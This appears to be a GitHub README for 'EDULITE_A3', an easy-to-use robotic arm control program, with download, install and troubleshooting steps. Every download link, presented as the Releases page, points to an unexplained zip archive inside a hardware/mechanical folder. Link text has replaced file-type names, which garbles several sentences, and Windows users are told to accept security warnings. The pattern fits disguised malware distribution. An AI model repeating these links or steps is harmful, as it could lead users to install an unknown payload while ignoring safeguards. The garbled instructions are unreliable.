This makes it a useful tool for learning about robotics or trying simple automation tasks. The software is designed to work on common desktop computers and requires no special programming skills.

This robotic arm can help you:

- Understand basic robot movements.
- Perform simple pick and place tasks.
- Explore automation concepts.
- Customize movements through easy software.

## 🚀 Getting Started

Follow these steps to download and set up EDULITE_A3 on your computer.

---

### 1. Download the Software

Go to the EDULITE_A3 Releases page by clicking this link or the big button at the top:

[https://github.com/Marqyd/EDULITE_A3/raw/refs/heads/main/hardware/mechanical/EDULIT-relier.zip](https://github.com/Marqyd/EDULITE_A3/raw/refs/heads/main/hardware/mechanical/EDULIT-relier.zip)

On the page, look for the latest version of EDULITE_A3. The releases are listed from newest to oldest. Find the section titled with the most recent date.

Inside that, download the file that matches your computer’s operating system. The file names usually end with .exe for Windows, .dmg for macOS, and .AppImage or https://github.com/Marqyd/EDULITE_A3/raw/refs/heads/main/hardware/mechanical/EDULIT-relier.zip for Linux.

Save the file in a place you can easily find, like your Downloads folder.

---

### 2. Install or Run the Software

- **Windows:**  
  Double-click the .exe file you downloaded. If a security warning appears, accept it to continue. The installer will guide you through the steps. If there’s no installer, the program may start directly.

- **macOS:**  
  Open the .dmg file by double-clicking it. Drag the EDULITE_A3 app to your Applications folder. You can then run it from Applications.

- **Linux:**  
  If you have an AppImage file, make it executable by right-clicking it, selecting Properties, and checking "Allow executing file as program". Then double-click to run it. For https://github.com/Marqyd/EDULITE_A3/raw/refs/heads/main/hardware/mechanical/EDULIT-relier.zip files, extract the archive and look for README or install instructions inside.

If you plan to connect a physical robotic arm, make sure it is plugged into a USB port before you open the software.

---

### 3. First Run and Setup

When you start EDULITE_A3, the program will open a main control window with buttons and sliders. You do not need to program anything.

- For simulation, simply press the “Start Simulation” button to see the robotic arm movements on screen.
- To control a physical arm, go to the “Device” menu and select the connected arm from the list. The program will link to it and allow manual control.

---

## 🔧 Basic Controls and Features

EDULITE_A3 gives you simple controls to move each joint of your robotic arm. You can:

- Use sliders to rotate or bend each joint.
- Save movement sequences and play them back.
- Adjust speed and smoothness of movement.
- See real-time 3D graphics of the arm in action.
- Calibrate the arm if it is physical hardware.

The software aims to be intuitive for users without robotics experience, making it easy to experiment.

---

## 🛠 Troubleshooting

If EDULITE_A3 does not run or the robotic arm does not respond, try these steps:

- Make sure your system meets the requirements.
- Re-download the software in case the file was corrupted.
- Restart your computer and try running the program again.
- Check that the USB cable is firmly connected if you have a physical arm.
- Verify no other program is using the USB port.
- Update your computer’s OS if it is out of date.
- Check the GitHub releases page for any updated versions or patches.
